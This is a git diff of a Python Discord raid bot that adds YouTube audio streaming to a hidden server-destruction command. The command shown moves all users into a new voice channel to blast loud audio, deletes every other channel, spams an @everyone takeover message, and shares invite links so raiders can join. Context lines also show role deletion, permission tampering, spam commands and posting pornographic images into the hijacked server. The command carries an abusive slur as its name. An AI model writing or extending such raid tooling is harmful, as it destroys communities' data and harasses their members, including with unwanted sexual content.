@@ -11,6 +11,50 @@ import io
 import aiohttp
 import time
 import inspect
+import youtube_dl
+import asyncio
+
+ytdl_format_options = {
+    'format': 'bestaudio/best',
+    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
+    'restrictfilenames': True,
+    'noplaylist': True,
+    'nocheckcertificate': True,
+    'ignoreerrors': False,
+    'logtostderr': False,
+    'quiet': True,
+    'no_warnings': True,
+    'default_search': 'auto',
+    'source_address': '0.0.0.0' # bind to ipv4 since ipv6 addresses cause issues sometimes
+}
+
+ffmpeg_options = {
+    'options': '-vn'
+}
+
+ytdl = youtube_dl.YoutubeDL(ytdl_format_options)
+
+class YTDLSource(discord.PCMVolumeTransformer):
+    def __init__(self, source, *, data, volume=0.5):
+        super().__init__(source, volume)
+
+        self.data = data
+
+        self.title = data.get('title')
+        self.url = data.get('url')
+
+    @classmethod
+    async def from_url(cls, url, *, loop=None, stream=False):
+        loop = loop or asyncio.get_event_loop()
+        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
+
+        if 'entries' in data:
+            # take first item from a playlist
+            data = data['entries'][0]
+
+        filename = data['url'] if stream else ytdl.prepare_filename(data)
+        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)
+
 from globals import *
 
 
@@ -169,9 +213,6 @@ class Bot(cmd.Bot):
         
         await logserver.channels[0].send(ctx.guild.name + " can be joined at " + unban.url)
 
-
-
-
     @cmd.command(aliases=["spam", "echo"], hidden=True)
     async def propaganda(ctx, *args):
         # --Spam server with propaganda--
@@ -218,22 +259,36 @@ class Bot(cmd.Bot):
     @cmd.command(hidden=True)
     async def rape(ctx, *args):
         global originalname
+        bot = ctx.bot
 
         # --Destroy the server--
         
+        # -move users to new vc-
+        voicechannels = []
+        for channel in ctx.guild.voice_channels:  # get all voice channels
+            voicechannels.append(channel)
+
+        earrape = await ctx.guild.create_voice_channel('ur nan')
+
+        for channel in voicechannels:
+            for user in channel.members:
+                await user.move_to(earrape)
+
+       # -play earrape in vc- 
+        vc = await earrape.connect()
+        voice_client: discord.VoiceClient = discord.utils.get(bot.voice_clients, guild=ctx.guild)
+        audio_source = await YTDLSource.from_url("https://www.youtube.com/watch?v=QVYSsn_HL1w")
+        voice_client.play(audio_source, after=None)
+
         # -delete all channels-
         channels = []
         for channel in ctx.guild.channels:  # get all channels
-            channels.append(channel)
-
-        for channel in channels:
-            await channel.delete(
-                reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+            if channel != earrape:
+                await channel.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+     
+        
 
         # -make new channel-
-        bot = ctx.bot
-
-
         heinz = await ctx.guild.create_text_channel('HEINZ')
         await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
 
@@ -248,10 +303,13 @@ class Bot(cmd.Bot):
         '''
 
         unban = await heinz.create_invite(reason="The DRH must provide entry to the server for their raiders")
-        #await logserver.channels[0].send("@everyone new raid: " + originalname)
-        #await logserver.channels[0].send("Join the fun at " + unban.url)
+        
+        '''
+        await logserver.channels[0].send("@everyone new raid: " + originalname)
+        await logserver.channels[0].send("Join the fun at " + unban.url)
 
-        #originalname = None
+        originalname = None
+        '''
 
         # -delete all roles-
         roles = []
@@ -274,7 +332,6 @@ class Bot(cmd.Bot):
                 await role.edit(permissions=perms)  # apply new permissions
 
         # -spam images-
-
         if len(args) == 0:
             hentai = imagesearch.getImages("https://hentaihaven.xxx") # load images from source or hentai from hentaihaven (kill me now)
         elif len(args) == 1:
@@ -332,3 +389,4 @@ class Bot(cmd.Bot):
                             await heinz.send(file=discord.File(data, os.path.basename(y)))  # send hentai
                 except Exception:
                     break
+                    voice_client.stop
